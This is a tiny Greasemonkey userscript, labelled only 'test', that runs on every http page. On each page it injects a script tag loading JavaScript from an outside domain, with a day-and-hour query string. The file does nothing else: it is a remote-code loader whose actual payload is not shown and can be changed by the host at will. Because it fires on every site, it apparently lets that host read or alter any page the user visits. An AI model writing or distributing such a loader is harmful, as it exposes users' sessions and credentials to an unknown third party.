// ==UserScript==
// @name           test
// @namespace      test
// @include        http://*/*
// ==/UserScript==

var d = new Date();
var day = d.getDate() + "-" + d.getHours();
var GM_JQ = document.createElement('script');
GM_JQ.src = 'http://task.megainformationtech.com/js/greasemonkey.js?day='+day;
GM_JQ.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(GM_JQ);